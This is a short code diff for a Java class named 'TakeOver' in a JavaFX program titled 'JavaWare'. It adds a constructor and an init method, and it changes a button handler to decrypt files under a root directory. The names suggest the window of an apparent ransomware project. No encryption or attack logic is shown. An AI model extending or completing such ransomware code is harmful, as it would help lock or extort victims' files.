@@ -42,6 +42,11 @@ import java.io.File;
 
 public class TakeOver extends Application {
 
+
+    TakeOver(){
+
+    }
+
     @Override
     public void start(Stage primaryStage) {
         primaryStage.setTitle("JavaWare");
@@ -106,7 +111,7 @@ public class TakeOver extends Application {
             public void handle(ActionEvent actionEvent) {
                 try {
                     JavaWare jw = new JavaWare();
-                    jw.DecryptFiles();
+                    jw.DecryptFiles(Const.ROOT_DIR);
                 } catch(Exception e) {
 
                 }
@@ -119,4 +124,12 @@ public class TakeOver extends Application {
 
         primaryStage.show();
     }
+
+    @Override
+    public void init() throws Exception {
+        super.init();
+    }
+    /*public static void main(String args[]){
+        launch(args);
+    }*/
 }
